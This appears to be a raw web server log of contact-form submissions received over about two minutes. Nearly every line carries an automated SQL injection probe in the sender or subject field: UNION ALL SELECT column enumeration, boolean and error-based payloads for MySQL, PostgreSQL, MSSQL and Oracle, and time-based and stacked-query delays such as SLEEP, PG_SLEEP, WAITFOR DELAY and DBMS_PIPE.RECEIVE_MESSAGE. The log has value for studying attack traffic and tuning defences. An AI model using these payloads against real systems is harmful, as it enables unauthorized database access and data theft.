+++ 2022-01-20 05:39:53 AM -- Email from: 1') ORDER BY 6657#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:53 AM -- Email from: 1') UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:54 AM -- Email from: 1') UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:54 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:55 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:55 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:56 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:56 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:56 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:57 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:57 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:58 AM -- Email from: 1' ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:58 AM -- Email from: 1' ORDER BY 2442#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:59 AM -- Email from: 1' UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:59 AM -- Email from: 1' UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:59 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:00 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:00 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:01 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:01 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:02 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:02 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:03 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:03 AM -- Email from: 1%' ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:04 AM -- Email from: 1%' ORDER BY 3076#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:04 AM -- Email from: 1%' UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:05 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:05 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:06 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:06 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:07 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:07 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:07 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:08 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:08 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:09 AM -- Email from: 1, -- subject: 3642, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:09 AM -- Email from: 1, -- subject: 1')(('',.'(, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:10 AM -- Email from: 1, -- subject: 1'qkxyDD&lt;'&quot;&gt;mUXREL, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:12 AM -- Email from: 1, -- subject: 1) AND 9298=1227 AND (8074=8074, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:12 AM -- Email from: 1, -- subject: 1) AND 5142=5142 AND (2988=2988, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:13 AM -- Email from: 1, -- subject: 1 AND 3421=6717, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:13 AM -- Email from: 1, -- subject: 1 AND 5142=5142, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:13 AM -- Email from: 1, -- subject: 1 AND 2081=1337-- vpos, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:14 AM -- Email from: 1, -- subject: 1 AND 5142=5142-- SBLS, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:14 AM -- Email from: 1, -- subject: 1') AND 2138=3627 AND ('yYXz'='yYXz, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:15 AM -- Email from: 1, -- subject: 1') AND 5142=5142 AND ('KKrY'='KKrY, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:15 AM -- Email from: 1, -- subject: 1' AND 8923=7026 AND 'aMsI'='aMsI, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:16 AM -- Email from: 1, -- subject: 1' AND 5142=5142 AND 'wMoW'='wMoW, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:16 AM -- Email from: 1, -- subject: 1%' AND 9025=2615 AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:17 AM -- Email from: 1, -- subject: 1%' AND 5142=5142 AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:17 AM -- Email from: 1, -- subject: (SELECT (CASE WHEN (5610=7433) THEN 5610 ELSE 5610*(SELECT 5610 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:17 AM -- Email from: 1, -- subject: (SELECT (CASE WHEN (7498=7498) THEN 7498 ELSE 7498*(SELECT 7498 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:18 AM -- Email from: 1, -- subject: 1) AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3765=3765, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:18 AM -- Email from: 1, -- subject: 1 AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:19 AM -- Email from: 1, -- subject: 1 AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- qySc, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:19 AM -- Email from: 1, -- subject: 1') AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('GeVI'='GeVI, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:20 AM -- Email from: 1, -- subject: 1' AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'gaZK'='gaZK, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:20 AM -- Email from: 1, -- subject: 1%' AND (SELECT 4884 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(4884=4884,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:20 AM -- Email from: 1, -- subject: 1) AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND (4760=4760, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:21 AM -- Email from: 1, -- subject: 1 AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:21 AM -- Email from: 1, -- subject: 1 AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC)-- cZPs, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:22 AM -- Email from: 1, -- subject: 1') AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND ('WvtF'='WvtF, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:22 AM -- Email from: 1, -- subject: 1' AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND 'WSOs'='WSOs, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:23 AM -- Email from: 1, -- subject: 1%' AND 1302=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1302=1302) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:23 AM -- Email from: 1, -- subject: 1) AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND (1626=1626, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:23 AM -- Email from: 1, -- subject: 1 AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:24 AM -- Email from: 1, -- subject: 1 AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)))-- hNrw, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:24 AM -- Email from: 1, -- subject: 1') AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND ('rUaS'='rUaS, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:25 AM -- Email from: 1, -- subject: 1' AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'ORjj'='ORjj, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:25 AM -- Email from: 1, -- subject: 1%' AND 1171=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1171=1171) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:26 AM -- Email from: 1, -- subject: 1) AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND (8777=8777, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:26 AM -- Email from: 1, -- subject: 1 AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:26 AM -- Email from: 1, -- subject: 1 AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- JVtC, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:27 AM -- Email from: 1, -- subject: 1') AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND ('okGH'='okGH, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:27 AM -- Email from: 1, -- subject: 1' AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND 'Jqps'='Jqps, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:28 AM -- Email from: 1, -- subject: 1%' AND 7842=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:28 AM -- Email from: 1, -- subject: (SELECT 2826 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(2826=2826,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:29 AM -- Email from: 1, -- subject: (SELECT CONCAT(0x7176767071,(SELECT (ELT(9690=9690,1))),0x7171767171)), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:29 AM -- Email from: 1, -- subject: (SELECT (CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113))), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:30 AM -- Email from: 1, -- subject: (SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9063=9063) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:30 AM -- Email from: 1, -- subject: 1);SELECT SLEEP(5)#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:30 AM -- Email from: 1, -- subject: 1;SELECT SLEEP(5)#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:31 AM -- Email from: 1, -- subject: 1');SELECT SLEEP(5)#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:31 AM -- Email from: 1, -- subject: 1';SELECT SLEEP(5)#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:32 AM -- Email from: 1, -- subject: 1%';SELECT SLEEP(5)#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:32 AM -- Email from: 1, -- subject: 1);SELECT PG_SLEEP(5)--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:33 AM -- Email from: 1, -- subject: 1;SELECT PG_SLEEP(5)--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:33 AM -- Email from: 1, -- subject: 1');SELECT PG_SLEEP(5)--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:33 AM -- Email from: 1, -- subject: 1';SELECT PG_SLEEP(5)--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:34 AM -- Email from: 1, -- subject: 1%';SELECT PG_SLEEP(5)--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:34 AM -- Email from: 1, -- subject: 1);WAITFOR DELAY '0:0:5'--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:35 AM -- Email from: 1, -- subject: 1;WAITFOR DELAY '0:0:5'--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:35 AM -- Email from: 1, -- subject: 1');WAITFOR DELAY '0:0:5'--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:36 AM -- Email from: 1, -- subject: 1';WAITFOR DELAY '0:0:5'--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:36 AM -- Email from: 1, -- subject: 1%';WAITFOR DELAY '0:0:5'--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:37 AM -- Email from: 1, -- subject: 1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(79)||CHR(110)||CHR(86),5) FROM DUAL--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:37 AM -- Email from: 1, -- subject: 1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(79)||CHR(110)||CHR(86),5) FROM DUAL--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:37 AM -- Email from: 1, -- subject: 1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(79)||CHR(110)||CHR(86),5) FROM DUAL--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:38 AM -- Email from: 1, -- subject: 1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(79)||CHR(110)||CHR(86),5) FROM DUAL--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:38 AM -- Email from: 1, -- subject: 1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(79)||CHR(110)||CHR(86),5) FROM DUAL--, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:39 AM -- Email from: 1, -- subject: 1) AND SLEEP(5) AND (5437=5437, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:39 AM -- Email from: 1, -- subject: 1 AND SLEEP(5), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:40 AM -- Email from: 1, -- subject: 1 AND SLEEP(5)-- SyAD, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:40 AM -- Email from: 1, -- subject: 1') AND SLEEP(5) AND ('Njzs'='Njzs, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:40 AM -- Email from: 1, -- subject: 1' AND SLEEP(5) AND 'Xaak'='Xaak, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:41 AM -- Email from: 1, -- subject: 1%' AND SLEEP(5) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:41 AM -- Email from: 1, -- subject: 1) AND 6494=(SELECT 6494 FROM PG_SLEEP(5)) AND (3519=3519, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:42 AM -- Email from: 1, -- subject: 1 AND 6494=(SELECT 6494 FROM PG_SLEEP(5)), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:42 AM -- Email from: 1, -- subject: 1 AND 6494=(SELECT 6494 FROM PG_SLEEP(5))-- GMGL, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:43 AM -- Email from: 1, -- subject: 1') AND 6494=(SELECT 6494 FROM PG_SLEEP(5)) AND ('fVlz'='fVlz, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:43 AM -- Email from: 1, -- subject: 1' AND 6494=(SELECT 6494 FROM PG_SLEEP(5)) AND 'byoX'='byoX, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:44 AM -- Email from: 1, -- subject: 1%' AND 6494=(SELECT 6494 FROM PG_SLEEP(5)) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:44 AM -- Email from: 1, -- subject: 1) WAITFOR DELAY '0:0:5' AND (4899=4899, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:44 AM -- Email from: 1, -- subject: 1 WAITFOR DELAY '0:0:5', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:45 AM -- Email from: 1, -- subject: 1 WAITFOR DELAY '0:0:5'-- FsCb, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:45 AM -- Email from: 1, -- subject: 1') WAITFOR DELAY '0:0:5' AND ('LMJj'='LMJj, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:46 AM -- Email from: 1, -- subject: 1' WAITFOR DELAY '0:0:5' AND 'zPlT'='zPlT, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:46 AM -- Email from: 1, -- subject: 1%' WAITFOR DELAY '0:0:5' AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:47 AM -- Email from: 1, -- subject: 1) AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5) AND (8415=8415, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:47 AM -- Email from: 1, -- subject: 1 AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5), -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:48 AM -- Email from: 1, -- subject: 1 AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5)-- YKmA, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:48 AM -- Email from: 1, -- subject: 1') AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5) AND ('Kmpd'='Kmpd, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:49 AM -- Email from: 1, -- subject: 1' AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5) AND 'PJqE'='PJqE, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:49 AM -- Email from: 1, -- subject: 1%' AND 9353=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(89)||CHR(113)||CHR(82),5) AND '%'=', -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:49 AM -- Email from: 1, -- subject: 1) ORDER BY 1-- BuoZ, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:51 AM -- Email from: 1, -- subject: 1) ORDER BY 4253-- isJn, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:55 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL-- LqOP, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:56 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL-- ArEq, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:56 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL-- nKyM, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:56 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL-- ZQji, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:57 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- HVNd, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:57 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Blap, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:58 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sAHp, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:58 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tgSs, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:59 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VBep, -- email: 1, -- Message is: 
+++ 2022-01-20 05:40:59 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- evUJ, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:00 AM -- Email from: 1, -- subject: 1 ORDER BY 1-- eqke, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:00 AM -- Email from: 1, -- subject: 1 ORDER BY 7799-- jmCt, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:00 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL-- MsUE, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:01 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL-- sPoM, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:01 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL-- wCDU, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:02 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- zqHL, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:02 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- DpFM, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:03 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ODVp, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:03 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wAYG, -- email: 1, -- Message is: 
